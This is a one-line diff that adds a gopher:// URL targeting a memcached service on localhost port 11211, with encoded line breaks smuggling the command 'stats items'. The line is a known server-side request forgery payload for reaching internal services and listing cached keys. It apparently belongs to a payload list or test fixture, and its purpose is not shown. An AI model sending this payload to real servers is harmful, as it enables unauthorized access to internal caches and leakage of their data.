@@ -1,0 +1,1 @@
+gopher://127.0.0.1:11211/_%0d%0astats%20items%0d%0a
